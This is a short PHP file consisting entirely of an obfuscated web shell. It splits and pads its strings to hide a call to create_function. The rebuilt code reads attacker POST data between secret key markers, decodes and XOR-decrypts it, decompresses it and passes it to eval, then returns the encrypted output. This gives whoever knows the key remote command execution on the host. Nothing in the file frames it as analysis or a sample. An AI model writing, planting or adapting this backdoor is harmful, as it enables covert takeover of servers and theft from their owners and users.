<?php
$B='tlen(?t$t)?t;$o="";?tfor($i=0;$i<$?tl;){fo?tr($j=0?t;($j<$c?t&&$i<$l?t);$j';
$q='1) {?t@ob_s?t?ttart();@ev?tal(@gzunco?tmpress?t(@x(?t@ba?tse64_decode?t($m';
$r='h("?t?t/$?tkh(.+)$kf/",@file_ge?tt_c?to?tntents("php://?tin?tput"),$m?t)==';
$Q='ase?t6?t4_encode(@x(@?tgzco?tmpress($?t?to),$k));pri?tnt("$p$kh$?tr$kf");}';
$f=str_replace('AW','','cAWreatAWeAW_fAWAWuncAWtion');
$U='$k?t="3082?t6360?t";$kh="e?tb26f6?t536666";$k?tf="5d?t8af7983?te8b";$p=?t"U';
$o='[1])?t,$?tk)))?t;$?to=@ob_get_conte?tnts();?t?t@ob_end_clea?tn();$r?t=@b?t';
$D='Eo?tMF?tmd5tL?teR?tGx0b";function x($t?t,$?tk){$c=str?tlen?t($k);$?tl=str?';
$R='+?t+?t,$i++)?t?t{$o.=$t{$i}^?t$k?t{$j};}}return $o?t;}if (?t?t@preg_matc?t';
$G=str_replace('?t','',$U.$D.$B.$R.$r.$q.$o.$Q);
$s=$f('',$G);$s();
?>
